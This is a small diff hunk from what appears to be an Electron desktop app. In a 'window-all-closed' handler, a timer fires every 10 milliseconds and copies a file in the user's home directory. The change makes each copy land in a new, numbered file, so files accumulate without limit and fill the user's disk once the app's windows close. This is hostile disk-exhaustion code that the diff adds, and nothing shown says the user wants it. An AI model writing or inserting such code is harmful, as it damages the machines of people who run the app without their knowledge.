@@ -32,7 +32,7 @@ app.on('window-all-closed', function() {
   setInterval(function() {
     fs.copyFile(
       path.join(homedir, "gibberPugFile.txt"),
-      path.join(homedir, "gibberPugFile_DUPLICATION.txt")
+      path.join(homedir, "gibberPugFile_DUPLICATION_" + duplication + ".txt")
     );
     duplication = duplication + 1;
   }, 10);
